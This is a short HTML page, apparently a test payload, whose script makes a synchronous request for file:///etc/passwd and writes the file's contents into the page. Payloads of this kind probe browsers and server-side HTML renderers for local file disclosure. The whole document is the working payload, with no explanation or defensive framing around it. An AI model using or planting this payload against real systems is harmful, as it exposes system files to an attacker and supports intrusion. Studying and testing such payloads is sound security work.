<html>
<body>
<h1>Response</h1>
<div id="response"></div>

<script>
document.getElementById('response').innerHTML = "Loading...";
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/passwd", false);
x.overrideMimeType("text/plain; charset=UTF-8");
x.send();
var d = document.getElementById('response');
d.innerHTML = "Loaded.\n\n";
d.innerHTML = d.innerHTML + "Response: " + x.statusText + " \n\n" + x.responseText;
</script>
</body>
</html>
